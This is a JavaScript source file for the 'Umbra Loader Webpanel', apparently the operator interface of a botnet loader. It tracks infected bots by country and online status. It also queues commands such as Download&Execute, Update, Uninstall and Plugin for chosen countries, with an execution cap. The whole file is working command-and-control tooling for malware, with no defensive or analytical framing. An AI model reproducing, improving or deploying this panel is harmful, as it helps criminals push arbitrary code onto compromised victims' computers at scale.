/*
        [Name]
        Umbra Loader Webpanel
        
        [Coder]
        Umbr4
        
        [History]
        + First version 
 */

Ext.onReady(function(){

    function change(value, meta, rec, row, col, store){
    var id = Ext.id();
    (function(){
        new Ext.ProgressBar({
            renderTo: id,
            value: value
        });
    }).defer(25)
    return '<span id="' + id + '"></span>';
    }
    function IsNumeric(sText)
    {
        var ValidChars = "0123456789.";
        var IsNumber=true;
        var Char;
        for (i = 0; i < sText.length && IsNumber == true; i++) 
      { 
      Char = sText.charAt(i); 
      if (ValidChars.indexOf(Char) == -1) 
         {
         IsNumber = false;
         }
      }
        return IsNumber;
    }
    function renderIcon_country(val) 
    { 
        return '<img src="./flags/' + val + '.png" >';
    }
    
    function renderIcon_symbol(val) 
    {
        return '<img src="./graphics/' + val + '.png" >';
    }
    
    var store_combobox = new Ext.data.SimpleStore({
        fields: ['cmd'],
        data : [
        ["Download&Execute"],
        ["Update"],
        ["Uninstall"],
        ["Plugin"]]
    }); 

    var store_delete = new Ext.data.Store({
	    proxy: new Ext.data.HttpProxy({url: 'delete_command.php?deleteID=0'}),
	    reader: new Ext.data.JsonReader({
            totalProperty: 'total',
		    root:'results'
        }, [{name: 'a'}, {name: 'b'},{name: 'c'}])
    });	

    var store_countries = new Ext.data.Store(
    {
	    proxy: new Ext.data.HttpProxy(
        {
            url: 'list_countries.php',
        }),
	    reader: new Ext.data.JsonReader(
        {
            totalProperty: 'total',
		    root:'results'
        },
        [{name: '0'}, {name: 'ID'},{name: '1'},{name: 'countryname'},{name: '2'},{name: 'countrycode'},{name: '3'},{name: 'totalbots'},{name:'online'}])
    });	
    
    var store_countries_pie = new Ext.data.Store(
    {
	    proxy: new Ext.data.HttpProxy(
        {
            url: 'list_countries_pie.php',
        }),
	    reader: new Ext.data.JsonReader(
        {
            totalProperty: 'total',
		    root:'results'
        },
        [{name: '0'}, {name: 'ID'},{name: '1'},{name: 'countryname'},{name: '2'},{name: 'countrycode'},{name: '3'},{name: 'totalbots'},{name:'online'}])
    });	
    
    var store_countries_command = new Ext.data.Store(
    {
	    proxy: new Ext.data.HttpProxy(
        {
            url: 'list_countries_command.php',
        }),
	    reader: new Ext.data.JsonReader(
        {
            totalProperty: 'total',
		    root:'results'
        },
        [{name: '0'}, {name: 'ID'},{name: '1'},{name: 'countryname'},{name: '2'},{name: 'countrycode'},{name: '3'},{name: 'totalbots'},{name:'online'}])
    });	
    
    var store_commands = new Ext.data.Store(
    {
	    proxy: new Ext.data.HttpProxy(
        {
        url: 'list_commands.php',
        }),
	    reader: new Ext.data.JsonReader(
        {
            totalProperty: 'total',
		    root:'results'
        }, 
        [{name: '0'}, {name: 'ID'},{name: '1'},{name: 'command'},{name: '2'},{name: 'parameters'},{name: '3'},{name: 'max'},{name: '4'},{name: 'done'}])
    });	
    var pieChart = new Ext.chart.PieChart({
			store: store_countries_pie,
			dataField: 'totalbots',
			categoryField : 'countryname',
            extraStyle:
            {
                legend:{
	                display: 'right',
	                padding: 10,
	                border:{
	                   color: '#CBCBCB',
	                   size: 1
	                }
	            }
           }
		});
        
    var lstCountries = new Ext.grid.GridPanel(
    {
        store: store_countries,
        columns: [
            {
                width: 24,
                dataIndex: 'countrycode',
                renderer: renderIcon_country              
            },
            {
                header   : 'Country', 
                width    : 120, 
                sortable : true,
                dataIndex: 'countryname'
            },
            {
                header   : 'Online', 
                width    : 75, 
                sortable : true, 
                renderer: function(v, m, rec) 
                {
                    return rec.get('online') + ' Bot(s)';
                }
            },
            {
                header   : 'Total', 
                width    : 75, 
                sortable : true, 
                renderer: function(v, m, rec) 
                {
                    return rec.get('totalbots') + ' Bot(s)';
                }
            }],
        stripeRows: true
    });
            
    var lstCommands = new Ext.grid.GridPanel(
    {
        store: store_commands,
        columns: [
             {
                width: 24,
                renderer: renderIcon_symbol, 
                dataIndex: 'command'                
            },
            {
                header   : 'ID', 
                width: 24,
                dataIndex: 'ID'                
            }
            ,
            {
                
                header   : 'Command', 
                width    : 160, 
                sortable : true, 
                dataIndex: 'command'
            },
            {
                id       :'id_param',
                header   : 'Parameter', 
                width    : 160, 
                sortable : true, 
                dataIndex: 'parameters'
            },
            {
                header   : 'Progress', 
                width    : 75, 
                sortable : true, 
                dataIndex: 'done',
                renderer:change
            },
            {
                xtype: 'actioncolumn',
                width: 24,
                items: [
                {
                    icon   : './graphics/cross-button.png',
                    handler: function(grid, rowIndex, colIndex) 
                    {
                        var rec = store_commands.getAt(rowIndex);
                        store_delete.proxy= new Ext.data.HttpProxy({url: 'delete_command.php?deleteID=' + rec.get('ID')});
                        store_delete.load();
                        store_commands.load();
                    }
                }               
                ]
                }],
        stripeRows: true,
        autoExpandColumn: 'id_param'
    });
    
    var pan_commands = new Ext.Panel(
    {
        id:'imgcommands',
        collapsible:false,
        layout:'fit',
        title:'Commands',
        tbar: new Ext.Toolbar({
            enableOverflow: true,
            items: [{
                text: 'Refresh',
                iconCls: 'refreshicon',
                handler:function()
                {
                    store_commands.load();
                    store_countries_pie.load();
                }
            }]
        }),
        items: lstCommands
    });
    
    var checkboxCombo = new Ext.ux.form.CheckboxCombo({
		anchor: '100%',
        fieldLabel: 'Countries',        
		mode: 'local',
        name:'addCountries', 
		store: store_countries_command,
		valueField: 'countrycode',
		displayField: 'countryname',
		allowBlank: false
	});
    
    var pan_chart = new Ext.Panel(
    {
        title:'Pie Chart',
        anchor: '100% 50%',
        items: [pieChart]
    });
    
    var pan_countries = new Ext.Panel(
    {
        title:'Country Statistics',
        anchor: '100% 50%',
        layout:'fit',
        tbar: new Ext.Toolbar({
            enableOverflow: true,
            items: [{
                text: 'Refresh',
                iconCls: 'refreshicon',
                handler:function()
                {
                    store_countries.load();
                }
            }]
        }),
        items: lstCountries
    });
    
    var pan_login = new Ext.FormPanel(
    { 
        frame:true, 
        title:'Add Command', 
        monitorValid:true,
        autoHeight: true,
        url:'add_command.php', 
        items:[
        { 
                    xtype: 'combo',
                    fieldLabel: 'Command',
                    store:store_combobox,
                    displayField: 'cmd',
                    name: 'addCommand',
                    allowBlank:false,
                    typeAhead: true,
                    editable: false,
                    triggerAction: 'all',
                    mode: 'local',
                    anchor: '100%'  
        },
        { 
                    xtype: 'textfield',
                    fieldLabel:'Parameters', 
                    name:'addParameters', 
                    anchor: '100%' ,
                    allowBlank:false
        },checkboxCombo,
        { 
                    xtype: 'textfield',
                    fieldLabel:'Max. Executions', 
                    name:'addMax', 
                    anchor: '100%' ,
                    allowBlank:false
        }
        ], 
         buttons:[
         { 
            text:'Add',
            formBind: true,
            handler:function()
            { 
                    pan_login.getForm().submit({ 
                        method:'POST', 
                        waitTitle:'Connecting', 
                        waitMsg:'Sending data...',
                        success:function()
                        { 
                            Ext.MessageBox.show({
                                title: 'Willkommen zu ExtJS',
                                msg: checkboxCombo.getValue(),
                                buttons: Ext.MessageBox.OK,
                                minWidth: 250,
                                modal: false
                            });
                            store_commands.load();
                        } 
                    }); 
         } 
     }]
    }); 
   
    var win_login = new Ext.Window(
    {
        layout:'fit',
        width:300,
        height:190,
        x:317,
        y:412,
        closable: false,
        resizable: false,
        plain: true,
        border: false,
        items: [pan_login]
	});
    
    var win_commands = new Ext.Window(
    {
        layout:'fit',
        width:600,
        height:300,
        x:317,
        y:110,
        closable: false,
        resizable: true,
        plain: true,
        border: false,
        items: [pan_commands]
	});
	
    var win_countries = new Ext.Window(
    {
        width:315,
        height:550,
        x:0,
        y:0,
        layout:'anchor',
        closable: false,
        resizable: true,
        border: false,
        titleCollapse: true,
        items: [pan_countries,pan_chart]
	});
    
    store_commands.load();
    store_countries.load();
    store_countries_pie.load();
    store_countries_command.load();
    
    win_login.show();
    win_commands.show();
	win_countries.show();
    
});